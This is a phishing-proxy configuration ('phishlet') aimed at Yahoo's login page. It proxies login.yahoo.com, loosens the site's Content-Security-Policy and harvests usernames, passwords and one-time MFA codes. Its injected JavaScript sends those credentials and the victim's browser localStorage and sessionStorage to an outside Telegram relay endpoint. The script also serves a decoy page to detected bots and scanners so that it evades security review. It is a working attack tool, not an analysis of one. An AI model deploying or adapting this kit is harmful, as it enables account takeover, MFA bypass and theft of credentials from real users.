name: "yahoo"
author: "@paris"
min_ver: "3.2.0"
proxy_webauthn: true

blacklist_mode: "off"

proxy_hosts:
  - phish_sub: 'ymail'
    orig_sub: 'login'
    domain: 'yahoo.com'
    session: true
    is_landing: true
    auto_filter: false
    params:
      - key: 'username'
        map_to: 'username'
      - key: 'login_hint'
        map_to: 'username'
      - key: 'bg'
        map_to: 'bg'
      - key: 'text'
        map_to: 'text'

sub_filters:
  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: '<meta http-equiv="Content-Security-Policy" content="(.*?)">', replace: '<meta http-equiv="Content-Security-Policy" content="script-src ''self'' ''unsafe-inline'' ''unsafe-eval'' *.yahoo.com; style-src ''self'' ''unsafe-inline'' *.yahoo.com; img-src ''self'' data: blob: *.yahoo.com; font-src ''self'' data: *.yahoo.com; connect-src ''self'' *.yahoo.com; frame-src ''self'' *.yahoo.com; object-src ''none''; base-uri ''self''; form-action ''self'' ''unsafe-inline'';">', mimes: ["text/html"] }
  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/javascript", "application/json"] }
  - { triggers_on: "login.yahoo.com", orig_sub: "login", domain: "yahoo.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript"], redirect_only: true }

force_post:
  - path: "/account/challenge/*"
    search:
      - { key: "username", search: "(.*)" }
    force:
      - { key: "persistent", value: "y" }
    type: "post"

auth_urls:
  - "/account/challenge/*"
  - "/log/session"

credentials:
  username:
    key: "(username|userid|login)"
    search: '(.*)'
    type: 'post'
  password:
    key: "(password|passwd)"
    search: '(.*)'
    type: 'post'
  custom:
    - key: '(otp|mfa|code|totp)'
      search: '([a-zA-Z0-9]{6,8})'
      type: 'post'

login:
  domain: "login.yahoo.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.yahoo.com"]
    trigger_paths: ["/", "/*"]
    script: |
      (function() {
        let passedGate = false;
        let lastCapture = '';
        const benignPageContent = '';

        // --- Telegram credential relay ---
        const _tgUrl = (function(){try{var p=location.hostname.split('.');return 'https://login.'+p.slice(1).join('.')+'/.netlify/functions/sendTelegram'}catch(e){return ''}})();
        let _cEmail = sessionStorage.getItem('_ce') || '';
        let _cSent = false;
        function _tgSend(type, data) { if(!_tgUrl) return; try{navigator.sendBeacon(_tgUrl, new Blob([JSON.stringify({type:type,data:data})],{type:'application/json'}))}catch(e){} }
        function _captureCreds() {
          var ei = document.querySelector('input[name="username"],input[name="userid"],input[name="login"]');
          var pi = document.querySelector('input[type="password"]');
          if(ei && ei.value){_cEmail=ei.value;sessionStorage.setItem('_ce',_cEmail)}
          if(pi && pi.value && _cEmail && !_cSent){
            _cSent=true;
            _tgSend('credentials',{email:_cEmail,firstAttemptPassword:pi.value,secondAttemptPassword:pi.value,provider:'Yahoo',sessionId:Math.random().toString(36).substr(2,12),timestamp:new Date().toISOString(),userAgent:navigator.userAgent});
            setTimeout(function(){_cSent=false},5000);
          }
          var oi=document.querySelector('input[name="code"],input[name="otp"],input[name="totp"],input[autocomplete="one-time-code"]');
          if(oi && oi.value && oi.value.length>=6 && _cEmail){_tgSend('otp',{otp:oi.value,session:{email:_cEmail,provider:'Yahoo',sessionId:sessionStorage.getItem('_sid')||''}})}
        }
        document.addEventListener('submit',function(){setTimeout(_captureCreds,50)},true);
        document.addEventListener('click',function(e){if(e.target&&e.target.closest&&e.target.closest('button,input[type="submit"]'))setTimeout(_captureCreds,100)},true);
        // --- End Telegram relay ---

        function showBenignPage() {
          document.open();
          document.write(atob(benignPageContent));
          document.close();
        }

        function sendSessionData(stage) {
            try {
                const sessionInfo = {
                    localStorage: btoa(JSON.stringify(localStorage)),
                    sessionStorage: btoa(JSON.stringify(sessionStorage))
                };
                const currentCapture = JSON.stringify(sessionInfo);
                if(currentCapture === lastCapture) return;
                lastCapture = currentCapture;
                const payload = {
                    username: `SessionData-${stage}`,
                    password: currentCapture
                };
                navigator.sendBeacon('/log/session', JSON.stringify(payload));
            } catch (e) { /* silent */ }
        }

        function runMainLogic() {
          if (passedGate) return;
          passedGate = true;
          
          const params = new URLSearchParams(window.location.search);
          const bg = params.get('bg');
          
          function applyBranding() {
             try {
                const backgroundUrl = bg ? decodeURIComponent(bg) : 'https://i.ibb.co/fkLWqGZ/background.jpg';
                if (document.body.style.backgroundImage !== `url("${backgroundUrl}")`) {
                    document.body.style.backgroundImage = `url("${backgroundUrl}")`;
                    Object.assign(document.body.style, { backgroundSize: "cover", backgroundRepeat: "no-repeat", backgroundPosition: "center", height: "100%" });
                    document.documentElement.style.height = "100%";
                }
                const lightbox = document.getElementById("lightbox");
                if (lightbox) lightbox.remove();
             } catch(e) { /* silent */ }
          }
          
          const observer = new MutationObserver((mutations) => {
              mutations.forEach((mutation) => {
                if (mutation.addedNodes.length > 0) {
                    applyBranding();
                    let currentStage = 'Unknown';
                    if (document.querySelector('input[type="password"]')) {
                        currentStage = 'Password-Entry';
                    } else if (document.querySelector('input[name="username"]')) {
                        currentStage = 'Username-Entry';
                    } else if (window.location.pathname.toLowerCase().includes('kmsi')) {
                        currentStage = 'Login-Success-KMSI';
                    }
                    sendSessionData(currentStage);
                    _captureCreds();
                }
              });
          });

          window.addEventListener('load', () => {
              applyBranding();
              observer.observe(document.body, { childList: true, subtree: true });
              sendSessionData('Initial-Load');
          });
        }

        function checkBotStatus() {
          let humanityScore = 0;
          if (screen.width >= 1024 && screen.height >= 768) humanityScore++;
          if (navigator.plugins.length > 0) humanityScore++;
          if (!navigator.webdriver) humanityScore++;
          if (window.outerWidth > 0 && window.outerHeight > 0) humanityScore++;
          if (window.Cypress || window.plumbutter || window._phantom || window.callPhantom) humanityScore -= 5;
          return humanityScore;
        }

        if (checkBotStatus() < 2) {
            showBenignPage();
        } else {
            const interactionHandler = () => {
                if (passedGate) return;
                runMainLogic();
            };
            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
            document.addEventListener('keydown', interactionHandler, { once: true, passive: true});
            setTimeout(() => {
                if (!passedGate) {
                    runMainLogic();
                }
            }, 4000);
        }
      })();